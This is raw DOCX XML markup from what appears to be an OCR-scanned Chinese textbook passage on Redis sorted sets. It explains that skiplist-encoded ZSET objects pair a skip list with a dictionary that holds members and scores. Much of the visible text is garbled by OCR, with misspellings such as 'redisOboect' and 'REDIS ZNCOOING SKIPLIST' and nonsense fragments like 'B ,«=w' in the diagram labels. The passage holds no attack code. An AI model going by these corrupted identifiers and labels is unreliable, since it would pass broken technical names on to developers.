        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="375" w:hRule="exact"/>
          <w:jc w:val="right"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcBorders>
              <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
              <w:left w:val="single" w:color="auto" w:sz="4" w:space="0"/>
            </w:tcBorders>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encoding</w:t>
            </w:r>
          </w:p>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REDIS ENCODING ZIPLIST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:vMerge w:val="continue"/>
            <w:tcBorders>
              <w:left w:val="single" w:color="auto" w:sz="4" w:space="0"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="225" w:hRule="exact"/>
          <w:jc w:val="right"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcBorders>
              <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>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Ptr</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcBorders>
              <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
              <w:left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—&gt;Qi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="300" w:hRule="exact"/>
          <w:jc w:val="right"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcBorders>
              <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
              <w:left w:val="single" w:color="auto" w:sz="4" w:space="0"/>
              <w:bottom w:val="single" w:color="auto" w:sz="4" w:space="0"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>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lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>•・・</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcBorders>
              <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
              <w:left w:val="single" w:color="auto" w:sz="4" w:space="0"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:widowControl w:val="0"/>
              <w:rPr>
                <w:sz w:val="10"/>
                <w:szCs w:val="10"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>(2)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>skiplist</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>编码</w:t>
      </w:r>
    </w:p>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skiplist</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>编码的有序集合对象底层实现是跳跃表和字典两种5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>每个跳跃表节点都保存一个集合元素，并按分值从小到大排列；节点的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>object</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>属性保 存了元素的成员，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>score</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>属性保存分值；</w:t>
      </w:r>
    </w:p>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字典的每个键值对保存一个集合元素，字典的键保存元素的成员，字典的值保存分值。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:line="1" w:lineRule="exact"/>
        <w:sectPr>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1490" w:right="1507" w:bottom="1580" w:left="1857" w:header="0" w:footer="3" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="76200" distB="1733550" distL="0" distR="0" simplePos="0" relativeHeight="125830144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>1706880</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>76200</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="685800" cy="428625"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapTopAndBottom/>
                <wp:docPr id="42" name="Shape 42"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="685800" cy="428625"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="11"/>
                              <w:keepNext w:val="0"/>
                              <w:keepLines w:val="0"/>
                              <w:widowControl w:val="0"/>
                              <w:pBdr>
                                <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
                                <w:bottom w:val="single" w:color="auto" w:sz="4" w:space="0"/>
                              </w:pBdr>
                              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                              <w:bidi w:val="0"/>
                              <w:spacing w:before="0" w:after="0" w:line="217" w:lineRule="exact"/>
                              <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                              <w:jc w:val="center"/>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>redisOboect</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:br w:type="textWrapping"/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>type</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:br w:type="textWrapping"/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>REDIS ZSET</w:t>
                            </w:r>
                          </w:p>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
                        <a:noAutofit/>
                      </wps:bodyPr>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape id="Shape 42" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:134.4pt;margin-top:6pt;height:33.75pt;width:54pt;mso-position-horizontal-relative:page;mso-wrap-distance-bottom:136.5pt;mso-wrap-distance-top:6pt;z-index:125830144;mso-width-relative:page;mso-height-relative:page;" filled="f" stroked="f" coordsize="21600,21600" o:gfxdata="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CKymRtgAAAAJAQAADwAA&#10;AAAAAAABACAAAAAiAAAAZHJzL2Rvd25yZXYueG1sUEsBAhQAFAAAAAgAh07iQBQHb6qkAQAAZQMA&#10;AA4AAAAAAAAAAQAgAAAAJwEAAGRycy9lMm9Eb2MueG1sUEsFBgAAAAAGAAYAWQEAAD0FAAAAAA==&#10;">
                <v:fill on="f" focussize="0,0"/>
                <v:stroke on="f"/>
                <v:imagedata o:title=""/>
                <o:lock v:ext="edit" aspectratio="f"/>
                <v:textbox inset="0mm,0mm,0mm,0mm">
                  <w:txbxContent>
                    <w:p>
                      <w:pPr>
                        <w:pStyle w:val="11"/>
                        <w:keepNext w:val="0"/>
                        <w:keepLines w:val="0"/>
                        <w:widowControl w:val="0"/>
                        <w:pBdr>
                          <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
                          <w:bottom w:val="single" w:color="auto" w:sz="4" w:space="0"/>
                        </w:pBdr>
                        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                        <w:bidi w:val="0"/>
                        <w:spacing w:before="0" w:after="0" w:line="217" w:lineRule="exact"/>
                        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                        <w:jc w:val="center"/>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>redisOboect</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:br w:type="textWrapping"/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>type</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:br w:type="textWrapping"/>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>REDIS ZSET</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="523875" distB="1257300" distL="0" distR="0" simplePos="0" relativeHeight="125830144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>1344930</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>523875</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1409700" cy="457200"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapTopAndBottom/>
                <wp:docPr id="44" name="Shape 44"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="1409700" cy="4572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•ncoclng</w:t>
                            </w:r>
                          </w:p>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="11"/>
                              <w:keepNext w:val="0"/>
                              <w:keepLines w:val="0"/>
                              <w:widowControl w:val="0"/>
                              <w:pBdr>
                                <w:bottom w:val="single" w:color="auto" w:sz="4" w:space="0"/>
                              </w:pBdr>
                              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                              <w:bidi w:val="0"/>
                              <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
                              <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                              <w:jc w:val="center"/>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>REDIS ZNCOOING SKIPLIST</w:t>
                            </w:r>
                          </w:p>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="11"/>
                              <w:keepNext w:val="0"/>
                              <w:keepLines w:val="0"/>
                              <w:widowControl w:val="0"/>
                              <w:pBdr>
                                <w:bottom w:val="single" w:color="auto" w:sz="4" w:space="0"/>
                              </w:pBdr>
                              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                              <w:bidi w:val="0"/>
                              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                              <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                              <w:jc w:val="center"/>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>Ptr</w:t>
                            </w:r>
                          </w:p>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
                        <a:noAutofit/>
                      </wps:bodyPr>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape id="Shape 44" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:105.9pt;margin-top:41.25pt;height:36pt;width:111pt;mso-position-horizontal-relative:page;mso-wrap-distance-bottom:99pt;mso-wrap-distance-top:41.25pt;z-index:125830144;mso-width-relative:page;mso-height-relative:page;" filled="f" stroked="f" coordsize="21600,21600" o:gfxdata="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7wAK7ZAAAACgEAAA8A&#10;AAAAAAAAAQAgAAAAIgAAAGRycy9kb3ducmV2LnhtbFBLAQIUABQAAAAIAIdO4kAF2ktFpAEAAGYD&#10;AAAOAAAAAAAAAAEAIAAAACgBAABkcnMvZTJvRG9jLnhtbFBLBQYAAAAABgAGAFkBAAA+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•ncoclng</w:t>
                      </w:r>
                    </w:p>
                    <w:p>
                      <w:pPr>
                        <w:pStyle w:val="11"/>
                        <w:keepNext w:val="0"/>
                        <w:keepLines w:val="0"/>
                        <w:widowControl w:val="0"/>
                        <w:pBdr>
                          <w:bottom w:val="single" w:color="auto" w:sz="4" w:space="0"/>
                        </w:pBdr>
                        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                        <w:bidi w:val="0"/>
                        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
                        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                        <w:jc w:val="center"/>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>REDIS ZNCOOING SKIPLIST</w:t>
                      </w:r>
                    </w:p>
                    <w:p>
                      <w:pPr>
                        <w:pStyle w:val="11"/>
                        <w:keepNext w:val="0"/>
                        <w:keepLines w:val="0"/>
                        <w:widowControl w:val="0"/>
                        <w:pBdr>
                          <w:bottom w:val="single" w:color="auto" w:sz="4" w:space="0"/>
                        </w:pBdr>
                        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                        <w:bidi w:val="0"/>
                        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                        <w:jc w:val="center"/>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>Ptr</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:drawing>
          <wp:anchor distT="847725" distB="1038225" distL="0" distR="0" simplePos="0" relativeHeight="125830144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>3049905</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>847725</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="276225" cy="352425"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:wrapTopAndBottom/>
            <wp:docPr id="46" name="Shape 46"/>
            <wp:cNvGraphicFramePr/>
            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                  <pic:nvPicPr>
                    <pic:cNvPr id="46" name="Shape 46"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId38"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="276225" cy="352425"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="457200" distB="0" distL="0" distR="0" simplePos="0" relativeHeight="125830144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>3869055</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>457200</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1609725" cy="1781175"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapTopAndBottom/>
                <wp:docPr id="48" name="Shape 48"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="1609725" cy="1781175"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="29"/>
                              <w:keepNext/>
                              <w:keepLines/>
                              <w:widowControl w:val="0"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                              <w:bidi w:val="0"/>
                              <w:spacing w:before="0" w:after="0" w:line="0" w:lineRule="atLeast"/>
                              <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                              <w:jc w:val="both"/>
                            </w:pPr>
                            <w:bookmarkStart w:id="330" w:name="bookmark97"/>
                            <w:bookmarkStart w:id="331" w:name="bookmark98"/>
                            <w:bookmarkStart w:id="332" w:name="bookmark99"/>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:sz w:val="200"/>
                                <w:szCs w:val="200"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>g</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:u w:val="single"/>
                                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                              </w:rPr>
                              <w:t>一</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:sz w:val="200"/>
                                <w:szCs w:val="200"/>
                                <w:u w:val="single"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t xml:space="preserve">B ,«=w </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t xml:space="preserve">-A </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                              </w:rPr>
                              <w:t xml:space="preserve">亠 </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>g</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                              </w:rPr>
                              <w:t>-亠</w:t>
                            </w:r>
                            <w:bookmarkEnd w:id="330"/>
                            <w:bookmarkEnd w:id="331"/>
                            <w:bookmarkEnd w:id="332"/>
                          </w:p>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr vert="eaVert" lIns="0" tIns="0" rIns="0" bIns="0" upright="1">
                        <a:noAutofit/>
                      </wps:bodyPr>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape id="Shape 48" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:304.65pt;margin-top:36pt;height:140.25pt;width:126.75pt;mso-position-horizontal-relative:page;mso-wrap-distance-bottom:0pt;mso-wrap-distance-top:36pt;z-index:125830144;mso-width-relative:page;mso-height-relative:page;" filled="f" stroked="f" coordsize="21600,21600" o:gfxdata="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5N/ONcAAAAKAQAADwAAAAAAAAABACAAAAAiAAAAZHJzL2Rvd25yZXYueG1sUEsBAhQAFAAA&#10;AAgAh07iQHvP/5u3AQAAgQMAAA4AAAAAAAAAAQAgAAAAJgEAAGRycy9lMm9Eb2MueG1sUEsFBgAA&#10;AAAGAAYAWQEAAE8FAAAAAA==&#10;">
                <v:fill on="f" focussize="0,0"/>
                <v:stroke on="f"/>
                <v:imagedata o:title=""/>
                <o:lock v:ext="edit" aspectratio="f"/>
                <v:textbox inset="0mm,0mm,0mm,0mm" style="layout-flow:vertical-ideographic;">
                  <w:txbxContent>
                    <w:p>
                      <w:pPr>
                        <w:pStyle w:val="29"/>
                        <w:keepNext/>
                        <w:keepLines/>
                        <w:widowControl w:val="0"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                        <w:bidi w:val="0"/>
                        <w:spacing w:before="0" w:after="0" w:line="0" w:lineRule="atLeast"/>
                        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                        <w:jc w:val="both"/>
                      </w:pPr>
                      <w:bookmarkStart w:id="330" w:name="bookmark97"/>
                      <w:bookmarkStart w:id="331" w:name="bookmark98"/>
                      <w:bookmarkStart w:id="332" w:name="bookmark99"/>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:sz w:val="200"/>
                          <w:szCs w:val="200"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>g</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:u w:val="single"/>
                          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                        </w:rPr>
                        <w:t>一</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:sz w:val="200"/>
                          <w:szCs w:val="200"/>
                          <w:u w:val="single"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t xml:space="preserve">B ,«=w </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
